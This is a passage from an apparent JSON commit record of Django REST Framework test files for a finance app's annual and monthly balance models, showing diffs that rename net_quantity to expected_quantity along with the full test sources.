self.assertEqual(10.14, last_monthly_balance.gross_quantity)\n        self.assertEqual(past_date.year, second_to_last_monthly_balance.year)\n        self.assertEqual(past_date.month, second_to_last_monthly_balance.month)\n        self.assertEqual(0, second_to_last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(10.14, last_annual_balance.gross_quantity)\n        # Test update diferent quantity\n        response = self.patch(self.revenue_url+'\/'+str(rev.id), {\n            'quantity': 20.86\n        })\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(20.86, last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(20.86, last_annual_balance.gross_quantity)\n    \n    def test_expense_update_date_balances(self):\n        \"\"\"\n        Checks that updating a expense creates a monthly and annual balance\n        with the expense quantity\n        \"\"\"\n        # Authenticate user\n        self.authenticate_user(self.credentials)\n        data = self.get_expense_data()\n        # Post expense\n        response = self.post(self.expense_url, data)\n        self.assertEqual(response.status_code, status.HTTP_201_CREATED)\n        # Update expense dfiferent date\n        exp = Expense.objects.get(name=data['name'])\n        past_date = (now() - timedelta(days=32)).date()\n        response = self.patch(self.expense_url+'\/'+str(exp.id), {\n            'date': str(past_date)\n        })\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        second_to_last_monthly_balance = MonthlyBalance.objects.get(\n            month=past_date.month\n        )\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(0, last_monthly_balance.gross_quantity)\n        self.assertEqual(past_date.year, second_to_last_monthly_balance.year)\n        self.assertEqual(past_date.month, second_to_last_monthly_balance.month)\n        self.assertEqual(-data['quantity'], \n            second_to_last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(-data['quantity'], last_annual_balance.gross_quantity)\n        # Test update diferent quantity and date\n        response = self.patch(self.expense_url+'\/'+str(exp.id), {\n            'date': str(now().date()),\n            'quantity': 10.14\n        })\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        second_to_last_monthly_balance = MonthlyBalance.objects.get(\n            month=past_date.month\n        )\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(-10.14, last_monthly_balance.gross_quantity)\n        self.assertEqual(past_date.year, second_to_last_monthly_balance.year)\n        self.assertEqual(past_date.month, second_to_last_monthly_balance.month)\n        self.assertEqual(0, second_to_last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(-10.14, last_annual_balance.gross_quantity)\n        # Test update diferent quantity\n        response = self.patch(self.expense_url+'\/'+str(exp.id), {\n            'quantity': 20.86\n        })\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(-20.86, last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(-20.86, last_annual_balance.gross_quantity)"},"\/backend\/djangorest\/balance\/tests\/test_filter.py":{"changes":[{"diff":"\n     def get_annual_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_filter.py","badparts":["            'net_quantity': 2.2,"],"goodparts":["            'expected_quantity': 2.2,"]},{"diff":"\n     def get_monthly_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year,\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_filter.py","badparts":["            'net_quantity': 2.2,"],"goodparts":["            'expected_quantity': 2.2,"]},{"diff":"\n         data = self.get_annual_balance_data()\n         AnnualBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_filter.py","badparts":["            net_quantity=data['net_quantity'],"],"goodparts":["            expected_quantity=data['expected_quantity'],"]},{"diff":"\n         data = self.get_monthly_balance_data()\n         MonthlyBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_filter.py","badparts":["            net_quantity=data['net_quantity'],"],"goodparts":["            expected_quantity=data['expected_quantity'],"]},{"diff":"\n         data = dict(response.data)\n         self.assertEqual(data['count'], 0)\n     \n-    def test_annual_balance_filter_net_quantity_min_and_max(self):\n+    def test_annual_balance_filter_expected_quantity_min_and_max(self):\n         \"\"\"\n-        Checks AnnualBalance filter by net_quantity min and max\n+        Checks AnnualBalance filter by expected_quantity min and max\n         \"\"\"\n         self.authenticate_add_annual_balance()\n-        url = self.annual_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'\n+        url = self.annual_balance_list+'?expected_quantity_min=1.0&expected_quantity_max=3.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\n         self.assertEqual(data['count'], 1)\n-        url = self.annual_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'\n+        url = self.annual_balance_list+'?expected_quantity_min=6.0&expected_quantity_max=8.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\n         self.assertEqual(data['count'], 0)\n \n-    def test_monthly_balance_filter_net_quantity_min_and_max(self):\n+    def test_monthly_balance_filter_expected_quantity_min_and_max(self):\n         \"\"\" \n-        Checks MonthlyBalance filter by net_quantity min and max\n+        Checks MonthlyBalance filter by expected_quantity min and max\n         \"\"\"\n         self.authenticate_add_monthly_balance()\n-        url = self.monthly_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'\n+        url = self.monthly_balance_list+'?expected_quantity_min=1.0&expected_quantity_max=3.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(response.data)\n         self.assertEqual(data['count'], 1)\n-        url = self.monthly_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'\n+        url = self.monthly_balance_list+'?expected_quantity_min=6.0&expected_quantity_max=8.0'\n         response = self.get(url)\n         self.assertEqual(response.status_code, status.HTTP_200_OK)\n         data = dict(respon","add":8,"remove":8,"filename":"\/backend\/djangorest\/balance\/tests\/test_filter.py","badparts":["    def test_annual_balance_filter_net_quantity_min_and_max(self):","        Checks AnnualBalance filter by net_quantity min and max","        url = self.annual_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'","        url = self.annual_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'","    def test_monthly_balance_filter_net_quantity_min_and_max(self):","        Checks MonthlyBalance filter by net_quantity min and max","        url = self.monthly_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'","        url = self.monthly_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'"],"goodparts":["    def test_annual_balance_filter_expected_quantity_min_and_max(self):","        Checks AnnualBalance filter by expected_quantity min and max","        url = self.annual_balance_list+'?expected_quantity_min=1.0&expected_quantity_max=3.0'","        url = self.annual_balance_list+'?expected_quantity_min=6.0&expected_quantity_max=8.0'","    def test_monthly_balance_filter_expected_quantity_min_and_max(self):","        Checks MonthlyBalance filter by expected_quantity min and max","        url = self.monthly_balance_list+'?expected_quantity_min=1.0&expected_quantity_max=3.0'","        url = self.monthly_balance_list+'?expected_quantity_min=6.0&expected_quantity_max=8.0'"]}],"source":"\nfrom django.utils.timezone import now import json from rest_framework.test import APITestCase from django.urls import reverse from coin.models import CoinType from custom_auth.models import InvitationCode, User import logging from balance.models import AnnualBalance, MonthlyBalance from rest_framework import status class DateBalanceFilterTests(APITestCase): def setUp(self): logging.disable(logging.WARNING) self.jwt_obtain_url=reverse('jwt_obtain_pair') self.annual_balance_list=reverse('annual-balance-list') self.monthly_balance_list=reverse('monthly-balance-list') self.coin_type=CoinType.objects.create(code='EUR') self.inv_code=InvitationCode.objects.create() self.user_data={ 'username':\"username\", 'email':\"email@test.com\", \"password\": \"password1@212\", \"password2\": \"password1@212\", 'inv_code': str(self.inv_code.code), } self.credentials={ 'email':\"email@test.com\", \"password\": \"password1@212\" } self.user=self.create_user() return super().setUp() def get(self, url): return self.client.get(url) def post(self, url, data={}): return self.client.post( url, json.dumps(data), content_type=\"application\/json\" ) def authenticate_user(self, credentials): jwt=self.post(self.jwt_obtain_url, credentials).data['access'] self.client.credentials(HTTP_AUTHORIZATION='Bearer ' +str(jwt)) def get_annual_balance_data(self): return{ 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': self.coin_type, 'owner': self.user, 'year': now().date().year } def get_monthly_balance_data(self): return{ 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': self.coin_type, 'owner': self.user, 'year': now().date().year, 'month': now().date().month } def create_user(self): user=User.objects.create( username=self.user_data['username'], email=self.user_data['email'], inv_code=self.inv_code, verified=True ) user.set_password(self.user_data['password']) user.save() return user def authenticate_add_annual_balance(self): self.authenticate_user(self.credentials) data=self.get_annual_balance_data() AnnualBalance.objects.create( gross_quantity=data['gross_quantity'], net_quantity=data['net_quantity'], coin_type=data['coin_type'], owner=data['owner'], year=data['year'], ) def authenticate_add_monthly_balance(self): self.authenticate_user(self.credentials) data=self.get_monthly_balance_data() MonthlyBalance.objects.create( gross_quantity=data['gross_quantity'], net_quantity=data['net_quantity'], coin_type=data['coin_type'], owner=data['owner'], year=data['year'], month=data['month'] ) def test_annual_balance_filter_coin_type(self): \"\"\" Checks AnnualBalance filter by coin_type \"\"\" self.authenticate_add_annual_balance() url=self.annual_balance_list+'?coin_type=EUR' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) def test_monthly_balance_filter_coin_type(self): \"\"\" Checks MonthlyBalance filter by coin_type \"\"\" self.authenticate_add_monthly_balance() url=self.monthly_balance_list+'?coin_type=EUR' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) def test_annual_balance_filter_gross_quantity_min_and_max(self): \"\"\" Checks AnnualBalance filter by gross_quantity min and max \"\"\" self.authenticate_add_annual_balance() url=self.annual_balance_list+'?gross_quantity_min=1.0&gross_quantity_max=3.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) url=self.annual_balance_list+'?gross_quantity_min=6.0&gross_quantity_max=8.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 0) def test_monthly_balance_filter_gross_quantity_min_and_max(self): \"\"\" Checks MonthlyBalance filter by gross_quantity min and max \"\"\" self.authenticate_add_monthly_balance() url=self.monthly_balance_list+'?gross_quantity_min=1.0&gross_quantity_max=3.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) url=self.monthly_balance_list+'?gross_quantity_min=6.0&gross_quantity_max=8.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 0) def test_annual_balance_filter_net_quantity_min_and_max(self): \"\"\" Checks AnnualBalance filter by net_quantity min and max \"\"\" self.authenticate_add_annual_balance() url=self.annual_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) url=self.annual_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 0) def test_monthly_balance_filter_net_quantity_min_and_max(self): \"\"\" Checks MonthlyBalance filter by net_quantity min and max \"\"\" self.authenticate_add_monthly_balance() url=self.monthly_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) url=self.monthly_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0' response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 0) def test_annual_balance_filter_year(self): \"\"\" Checks AnnualBalance filter by year \"\"\" self.authenticate_add_annual_balance() url=self.annual_balance_list+'?year='+str(now().date().year) response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) def test_annual_monthly_filter_year(self): \"\"\" Checks MonthlyBalance filter by year \"\"\" self.authenticate_add_monthly_balance() url=self.monthly_balance_list+'?year='+str(now().date().year) response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) def test_annual_monthly_filter_year(self): \"\"\" Checks MonthlyBalance filter by month \"\"\" self.authenticate_add_monthly_balance() url=self.monthly_balance_list+'?month='+str(now().date().month) response=self.get(url) self.assertEqual(response.status_code, status.HTTP_200_OK) data=dict(response.data) self.assertEqual(data['count'], 1) ","sourceWithComments":"from django.utils.timezone import now\nimport json\nfrom rest_framework.test import APITestCase\nfrom django.urls import reverse\nfrom coin.models import CoinType\nfrom custom_auth.models import InvitationCode, User\nimport logging\nfrom balance.models import AnnualBalance, MonthlyBalance\nfrom rest_framework import status\n\n\nclass DateBalanceFilterTests(APITestCase):\n    def setUp(self):\n        # Avoid WARNING logs while testing wrong requests \n        logging.disable(logging.WARNING)\n\n        self.jwt_obtain_url=reverse('jwt_obtain_pair')\n        self.annual_balance_list=reverse('annual-balance-list')\n        self.monthly_balance_list=reverse('monthly-balance-list')\n        self.coin_type = CoinType.objects.create(code='EUR')\n        # Create InvitationCodes\n        self.inv_code = InvitationCode.objects.create()\n        self.user_data={\n            'username':\"username\",\n            'email':\"email@test.com\",\n            \"password\": \"password1@212\",\n            \"password2\": \"password1@212\",\n            'inv_code': str(self.inv_code.code),\n        }\n        self.credentials = {\n            'email':\"email@test.com\",\n            \"password\": \"password1@212\"\n        }\n        self.user = self.create_user()\n        return super().setUp()\n    \n    def get(self, url) :\n        return self.client.get(url)\n    \n    def post(self, url, data={}) :\n        return self.client.post(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def authenticate_user(self, credentials):\n        # Get jwt token\n        jwt=self.post(self.jwt_obtain_url, credentials).data['access']\n        self.client.credentials(HTTP_AUTHORIZATION='Bearer ' + str(jwt))\n    \n    def get_annual_balance_data(self):\n        return {\n            'gross_quantity': 1.1,\n            'net_quantity': 2.2,\n            'coin_type': self.coin_type,\n            'owner': self.user,\n            'year': now().date().year\n        }\n    \n    def get_monthly_balance_data(self):\n        return {\n            'gross_quantity': 1.1,\n            'net_quantity': 2.2,\n            'coin_type': self.coin_type,\n            'owner': self.user,\n            'year': now().date().year,\n            'month': now().date().month\n        }\n    \n    def create_user(self):\n        user = User.objects.create(\n            username=self.user_data['username'],\n            email=self.user_data['email'],\n            inv_code=self.inv_code,\n            verified=True\n        )\n        user.set_password(self.user_data['password'])\n        user.save()\n        return user\n\n    def authenticate_add_annual_balance(self):\n        self.authenticate_user(self.credentials)\n        data = self.get_annual_balance_data()\n        AnnualBalance.objects.create(\n            gross_quantity=data['gross_quantity'],\n            net_quantity=data['net_quantity'],\n            coin_type=data['coin_type'],\n            owner=data['owner'],\n            year=data['year'],\n        )\n    \n    def authenticate_add_monthly_balance(self):\n        self.authenticate_user(self.credentials)\n        data = self.get_monthly_balance_data()\n        MonthlyBalance.objects.create(\n            gross_quantity=data['gross_quantity'],\n            net_quantity=data['net_quantity'],\n            coin_type=data['coin_type'],\n            owner=data['owner'],\n            year=data['year'],\n            month=data['month']\n        )\n    \n    \n    def test_annual_balance_filter_coin_type(self):\n        \"\"\"\n        Checks AnnualBalance filter by coin_type\n        \"\"\"\n        self.authenticate_add_annual_balance()\n        url = self.annual_balance_list+'?coin_type=EUR'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n\n    def test_monthly_balance_filter_coin_type(self):    \n        \"\"\"\n        Checks MonthlyBalance filter by coin_type\n        \"\"\"\n        self.authenticate_add_monthly_balance()\n        url = self.monthly_balance_list+'?coin_type=EUR'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n    \n    def test_annual_balance_filter_gross_quantity_min_and_max(self):\n        \"\"\"\n        Checks AnnualBalance filter by gross_quantity min and max\n        \"\"\"\n        self.authenticate_add_annual_balance()\n        url = self.annual_balance_list+'?gross_quantity_min=1.0&gross_quantity_max=3.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n        url = self.annual_balance_list+'?gross_quantity_min=6.0&gross_quantity_max=8.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 0)\n\n    def test_monthly_balance_filter_gross_quantity_min_and_max(self):\n        \"\"\"\n        Checks MonthlyBalance filter by gross_quantity min and max\n        \"\"\"\n        self.authenticate_add_monthly_balance()\n        url = self.monthly_balance_list+'?gross_quantity_min=1.0&gross_quantity_max=3.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n        url = self.monthly_balance_list+'?gross_quantity_min=6.0&gross_quantity_max=8.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 0)\n    \n    def test_annual_balance_filter_net_quantity_min_and_max(self):\n        \"\"\"\n        Checks AnnualBalance filter by net_quantity min and max\n        \"\"\"\n        self.authenticate_add_annual_balance()\n        url = self.annual_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n        url = self.annual_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 0)\n\n    def test_monthly_balance_filter_net_quantity_min_and_max(self):\n        \"\"\" \n        Checks MonthlyBalance filter by net_quantity min and max\n        \"\"\"\n        self.authenticate_add_monthly_balance()\n        url = self.monthly_balance_list+'?net_quantity_min=1.0&net_quantity_max=3.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n        url = self.monthly_balance_list+'?net_quantity_min=6.0&net_quantity_max=8.0'\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 0)\n    \n    def test_annual_balance_filter_year(self):\n        \"\"\"\n        Checks AnnualBalance filter by year\n        \"\"\"\n        self.authenticate_add_annual_balance()\n        url = self.annual_balance_list+'?year='+str(now().date().year)\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n    \n    def test_annual_monthly_filter_year(self):\n        \"\"\"\n        Checks MonthlyBalance filter by year\n        \"\"\"\n        self.authenticate_add_monthly_balance()\n        url = self.monthly_balance_list+'?year='+str(now().date().year)\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)\n\n    def test_annual_monthly_filter_year(self):\n        \"\"\"\n        Checks MonthlyBalance filter by month\n        \"\"\"\n        self.authenticate_add_monthly_balance()\n        url = self.monthly_balance_list+'?month='+str(now().date().month)\n        response = self.get(url)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 1)"},"\/backend\/djangorest\/balance\/tests\/test_pagination.py":{"changes":[{"diff":"\n     def get_annual_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_pagination.py","badparts":["            'net_quantity': 2.2,"],"goodparts":["            'expected_quantity': 2.2,"]},{"diff":"\n     def get_monthly_balance_data(self):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': self.user,\n             'year': now().date().year,\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_pagination.py","badparts":["            'net_quantity': 2.2,"],"goodparts":["            'expected_quantity': 2.2,"]},{"diff":"\n         data = self.get_annual_balance_data()\n         AnnualBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_pagination.py","badparts":["            net_quantity=data['net_quantity'],"],"goodparts":["            expected_quantity=data['expected_quantity'],"]},{"diff":"\n         data = self.get_monthly_balance_data()\n         MonthlyBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_pagination.py","badparts":["            net_quantity=data['net_quantity'],"],"goodparts":["            expected_quantity=data['expected_quantity'],"]},{"diff":"\n             'results': [\n                 {\n                     'gross_quantity': 1.1, \n-                    'net_quantity': 2.2,\n+                    'expected_quantity': 2.2,\n                     'coin_type': 'EUR',\n                     'year': now().date().year\n                 }\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_pagination.py","badparts":["                    'net_quantity': 2.2,"],"goodparts":["                    'expected_quantity': 2.2,"]},{"diff":"\n             'results': [\n                 {\n                     'gross_quantity': 1.1, \n-                    'net_quantity': 2.2,\n+                    'expected_quantity': 2.2,\n                     'coin_type': 'EUR',\n                     'year': now().date().year,\n                     'month': now().dat","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_pagination.py","badparts":["                    'net_quantity': 2.2,"],"goodparts":["                    'expected_quantity': 2.2,"]}],"source":"\nfrom django.utils.timezone import now import json from rest_framework.test import APITestCase from django.urls import reverse from balance.models import AnnualBalance, CoinType, MonthlyBalance from custom_auth.models import InvitationCode, User import logging class DateBalancePaginationTests(APITestCase): def setUp(self): logging.disable(logging.WARNING) self.jwt_obtain_url=reverse('jwt_obtain_pair') self.annual_balance_list=reverse('annual-balance-list') self.monthly_balance_list=reverse('monthly-balance-list') self.inv_code=InvitationCode.objects.create() self.coin_type=CoinType.objects.create(code='EUR') self.user_data={ 'username':\"username\", 'email':\"email@test.com\", \"password\": \"password1@212\", \"password2\": \"password1@212\", 'inv_code': str(self.inv_code.code), } self.credentials={ 'email':\"email@test.com\", \"password\": \"password1@212\" } self.user=self.create_user() return super().setUp() def get(self, url): return self.client.get(url) def post(self, url, data={}): return self.client.post( url, json.dumps(data), content_type=\"application\/json\" ) def authenticate_user(self, credentials): jwt=self.post(self.jwt_obtain_url, credentials).data['access'] self.client.credentials(HTTP_AUTHORIZATION='Bearer ' +str(jwt)) def get_annual_balance_data(self): return{ 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': self.coin_type, 'owner': self.user, 'year': now().date().year } def get_monthly_balance_data(self): return{ 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': self.coin_type, 'owner': self.user, 'year': now().date().year, 'month': now().date().month } def create_user(self): user=User.objects.create( username=self.user_data['username'], email=self.user_data['email'], inv_code=self.inv_code, verified=True ) user.set_password(self.user_data['password']) user.save() return user def authenticate_add_annual_balance(self): self.authenticate_user(self.credentials) self.add_annual_balance() def add_annual_balance(self): data=self.get_annual_balance_data() AnnualBalance.objects.create( gross_quantity=data['gross_quantity'], net_quantity=data['net_quantity'], coin_type=data['coin_type'], owner=data['owner'], year=data['year'], ) def authenticate_add_monthly_balance(self): self.authenticate_user(self.credentials) self.add_monthly_balance() def add_monthly_balance(self): data=self.get_monthly_balance_data() MonthlyBalance.objects.create( gross_quantity=data['gross_quantity'], net_quantity=data['net_quantity'], coin_type=data['coin_type'], owner=data['owner'], year=data['year'], month=data['month'] ) def test_annual_balance_pagination_scheme(self): \"\"\" Checks AnnualBalance pagination scheme is correct \"\"\" self.authenticate_add_annual_balance() response=self.get(self.annual_balance_list) scheme=dict(response.data) scheme['results']=[] results=dict(response.data)['results'] for result in results: result.pop('created') scheme['results'] +=[dict(result)] expected_scheme={ 'count': 1, 'next': None, 'previous': None, 'results':[ { 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': 'EUR', 'year': now().date().year } ] } self.assertEqual(scheme, expected_scheme) def test_annual_balance_two_pages(self): \"\"\" Checks 2 pages of AnnualBalance data is correct \"\"\" self.authenticate_add_annual_balance() for i in range(19): self.add_annual_balance() response=self.get(self.annual_balance_list) data=dict(response.data) self.assertEqual(data['count'], 20) self.assertEqual(len(data['results']), 10) response=self.get(data['next']) self.assertEqual(data['count'], 20) self.assertEqual(len(data['results']), 10) def test_monthly_balance_pagination_scheme(self): \"\"\" Checks MonthlyBalance pagination scheme is correct \"\"\" self.authenticate_add_monthly_balance() response=self.get(self.monthly_balance_list) scheme=dict(response.data) scheme['results']=[] results=dict(response.data)['results'] for result in results: result.pop('created') scheme['results'] +=[dict(result)] expected_scheme={ 'count': 1, 'next': None, 'previous': None, 'results':[ { 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': 'EUR', 'year': now().date().year, 'month': now().date().month } ] } self.assertEqual(scheme, expected_scheme) def test_monthly_balance_two_pages(self): \"\"\" Checks 2 pages of MonthlyBalance data is correct \"\"\" self.authenticate_add_monthly_balance() for i in range(19): self.add_monthly_balance() response=self.get(self.monthly_balance_list) data=dict(response.data) self.assertEqual(data['count'], 20) self.assertEqual(len(data['results']), 10) response=self.get(data['next']) self.assertEqual(data['count'], 20) self.assertEqual(len(data['results']), 10) ","sourceWithComments":"from django.utils.timezone import now\nimport json\nfrom rest_framework.test import APITestCase\nfrom django.urls import reverse\nfrom balance.models import AnnualBalance, CoinType, MonthlyBalance\nfrom custom_auth.models import InvitationCode, User\nimport logging\n\n\nclass DateBalancePaginationTests(APITestCase):\n    def setUp(self):\n        # Avoid WARNING logs while testing wrong requests \n        logging.disable(logging.WARNING)\n\n        self.jwt_obtain_url=reverse('jwt_obtain_pair')\n        self.annual_balance_list=reverse('annual-balance-list')\n        self.monthly_balance_list=reverse('monthly-balance-list')\n        # Create InvitationCodes\n        self.inv_code = InvitationCode.objects.create()\n        self.coin_type = CoinType.objects.create(code='EUR')\n        self.user_data={\n            'username':\"username\",\n            'email':\"email@test.com\",\n            \"password\": \"password1@212\",\n            \"password2\": \"password1@212\",\n            'inv_code': str(self.inv_code.code),\n        }\n        self.credentials = {\n            'email':\"email@test.com\",\n            \"password\": \"password1@212\"\n        }\n        self.user = self.create_user()\n        return super().setUp()\n    \n    def get(self, url) :\n        return self.client.get(url)\n    \n    def post(self, url, data={}) :\n        return self.client.post(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def authenticate_user(self, credentials):\n        # Get jwt token\n        jwt=self.post(self.jwt_obtain_url, credentials).data['access']\n        self.client.credentials(HTTP_AUTHORIZATION='Bearer ' + str(jwt))\n    \n    def get_annual_balance_data(self):\n        return {\n            'gross_quantity': 1.1,\n            'net_quantity': 2.2,\n            'coin_type': self.coin_type,\n            'owner': self.user,\n            'year': now().date().year\n        }\n    \n    def get_monthly_balance_data(self):\n        return {\n            'gross_quantity': 1.1,\n            'net_quantity': 2.2,\n            'coin_type': self.coin_type,\n            'owner': self.user,\n            'year': now().date().year,\n            'month': now().date().month\n        }\n    \n    def create_user(self):\n        user = User.objects.create(\n            username=self.user_data['username'],\n            email=self.user_data['email'],\n            inv_code=self.inv_code,\n            verified=True\n        )\n        user.set_password(self.user_data['password'])\n        user.save()\n        return user\n\n    def authenticate_add_annual_balance(self):\n        self.authenticate_user(self.credentials)\n        self.add_annual_balance()\n    \n    def add_annual_balance(self):\n        data = 